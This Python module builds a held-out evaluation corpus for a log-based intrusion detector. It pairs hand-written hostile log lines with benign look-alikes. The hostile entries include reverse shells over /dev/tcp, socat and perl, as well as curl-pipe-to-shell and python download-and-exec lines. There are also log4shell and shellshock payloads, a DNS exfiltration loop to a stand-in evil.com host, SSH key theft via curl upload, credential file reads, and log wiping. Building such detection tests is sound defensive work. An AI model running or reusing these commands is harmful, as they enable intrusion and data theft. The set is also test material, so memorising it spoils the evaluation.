"""
HONEST held-out evaluation corpus for the raw-log model.

The training data (log_synthetic.py) and any split of it share one generator, so
metrics on that split measure memorisation, not generalisation — which is why a
model can read ROC-AUC 1.0 yet miss real reverse shells. This module provides an
independent yard-stick the model NEVER trains on:

  * HELD_OUT_ATTACKS — hand-authored hostile log lines using different tools,
    phrasings and CVEs than the generator (log4shell, pkexec, dirty-pipe, DNS
    exfil, psexec, …). If a feature set generalises, these score high; if it only
    memorised generator templates, they leak through. This is the real recall test.

  * benign_eval() — REAL archive lines from the host (the production benign
    distribution). This is the real false-positive test.

Both training AND threshold selection must stay blind to this set; it is used only
to choose the operating point and to report honest precision/recall.
"""

import json

from attack_labels import is_operational_log


def _ev(full, location="/var/log/syslog", level=0):
    return {"full_log": full, "location": location,
            "decoder": {"name": location.split()[0] if location else "unknown"}}


# Hand-authored — deliberately unlike log_synthetic's phrasings/tools.
HELD_OUT_ATTACKS = [
    # reverse / bind shells (novel forms)
    _ev("Apr 03 11:22:31 host bash[4412]: /bin/bash -c 'exec 5<>/dev/tcp/45.77.12.9/443;cat <&5|sh >&5 2>&5'", "/var/log/auth.log"),
    _ev("May 19 02:14:55 host sh[9931]: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:198.51.100.4:9000", "journald"),
    _ev("Jun 01 07:41:12 host perl[2210]: perl -e 'use Socket;connect(S,sockaddr_in(4444,inet_aton(\"185.100.87.2\")));exec(\"/bin/sh -i\");'", "journald"),
    # download-and-execute (novel)
    _ev("Feb 28 19:03:44 host curl[7781]: curl -fsSL http://159.65.20.3/i.sh | sh", "journald"),
    _ev("Mar 15 22:51:09 host bash[5521]: python3 -c \"import urllib.request as u;exec(u.urlopen('http://141.98.10.9/p.py').read())\"", "journald"),
    # web exploitation (CVEs / novel payloads)
    _ev('45.135.232.9 - - [10/Oct/2026:14:03:21] "GET /?x=${jndi:ldap://45.135.232.9:1389/a} HTTP/1.1" 200 12 "-" "${jndi:ldap://x}"', "apache"),
    _ev('193.42.33.8 - - [11/Oct/2026:09:12:44] "POST /cgi-bin/../../../../bin/sh HTTP/1.1" 200 88 "-" "() { :;}; /bin/eject"', "apache"),
    _ev('80.66.76.5 - - [12/Oct/2026:03:31:02] "GET /index.php?id=1%20AND%201=1%20UNION%20ALL%20SELECT%20NULL,version()-- HTTP/1.1" 200 500 "-" "Mozilla"', "apache"),
    _ev('91.219.236.7 - - [13/Oct/2026:23:44:19] "GET /../../../../etc/passwd%00.png HTTP/1.1" 200 1900 "-" "Nikto"', "apache"),
    # privilege escalation (real CVEs)
    _ev("Jul 07 05:19:03 host pkexec[3391]: pwnkit: GLIBC_TUNABLES=... pkexec exploit CVE-2021-4034", "journald"),
    _ev("Aug 12 16:02:38 host bash[8842]: printf '\\x00\\x00' | dd of=/etc/passwd bs=1 seek=0 conv=notrunc  # dirty pipe CVE-2022-0847", "journald"),
    _ev("Sep 02 12:41:57 host sudo[1123]: user : TTY=pts/1 ; PWD=/tmp ; USER=#-1 ; COMMAND=/bin/bash", "/var/log/auth.log"),
    # credential / secret theft (novel targets)
    _ev("Oct 05 08:22:14 host bash[6610]: cat /etc/gshadow /root/.aws/credentials ~/.kube/config", "journald"),
    _ev("Nov 09 21:07:50 host bash[7712]: gcore -o /tmp/lsass $(pgrep -f gnome-keyring)", "journald"),
    # exfiltration (novel channels)
    _ev("Dec 01 04:12:33 host bash[9210]: for f in /var/www/*; do dig +short $(base64 $f).exfil.evil.com; done", "journald"),
    _ev("Dec 18 13:59:41 host bash[3301]: tar czf - ~/.ssh | openssl enc -aes-256-cbc -k p | curl -T - http://45.9.1.2/up", "journald"),
    # lateral movement / persistence
    _ev("Jan 07 10:30:22 host bash[4409]: echo 'ssh-ed25519 AAAAC3... attacker' >> ~/.ssh/authorized_keys", "journald"),
    _ev("Jan 22 18:44:05 host python[8890]: impacket-psexec administrator@10.0.0.15 -hashes :aad3b435b51404ee", "journald"),
    _ev("Feb 03 06:15:49 host systemd[1]: Created backdoor.service - persist via crontab @reboot nc -e /bin/sh", "journald"),
    # anti-forensics / recon
    _ev("Feb 20 23:11:38 host bash[1180]: journalctl --vacuum-time=1s; truncate -s0 /var/log/auth.log", "journald"),
    _ev("Mar 09 15:27:04 host bash[2288]: for ip in $(seq 1 254); do nc -zv 10.0.0.$ip 22 2>&1; done", "journald"),
]


# Benign EVAL edge cases that superficially resemble attacks (must NOT flag).
HELD_OUT_BENIGN = [
    _ev("Apr 03 09:00:01 host sudo[201]: admin : PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/curl -fsS https://api.internal/health", "journald", 3),
    _ev("Apr 03 09:05:12 host sudo[233]: deploy : PWD=/srv ; USER=root ; COMMAND=/usr/bin/find /var/log -name '*.gz' -mtime +30 -delete", "journald", 3),
    _ev("Apr 03 09:11:44 host bash[288]: git pull && chmod +x ./scripts/deploy.sh && ./scripts/deploy.sh", "journald", 3),
    _ev("Apr 03 09:20:03 host CRON[402]: (root) CMD (cd / && run-parts --report /etc/cron.daily)", "journald", 3),
    _ev("Apr 03 09:31:29 host sshd[512]: Accepted publickey for deploy from 10.0.0.7 port 51022 ssh2: ED25519 SHA256:abc", "/var/log/auth.log", 3),
    _ev('10.0.0.9 - - [03/Apr/2026:09:40:11] "GET /wp-json/wp/v2/posts?per_page=10 HTTP/1.1" 200 8123 "-" "Mozilla/5.0"', "apache", 0),
    _ev("Apr 03 09:44:52 host sudo[701]: backup : PWD=/ ; USER=root ; COMMAND=/usr/bin/wget -q https://mirror.example.com/pkg.tar.gz -O /srv/pkg.tar.gz", "journald", 3),
    _ev("Apr 03 09:50:18 host dockerd[335]: level=info msg=\"API listen on /run/docker.sock\"", "journald", 3),
]


def benign_eval(archives_path, cap=6000):
    """Real archive lines (operational excluded, as at serve time) + benign edge cases."""
    out = []
    try:
        with open(archives_path, errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    ev = json.loads(line)
                except ValueError:
                    continue
                if isinstance(ev, dict) and ev.get("full_log") and not is_operational_log(ev):
                    out.append(ev)
                    if len(out) >= cap:
                        break
    except OSError:
        pass
    return out + HELD_OUT_BENIGN


def attack_eval():
    return list(HELD_OUT_ATTACKS)
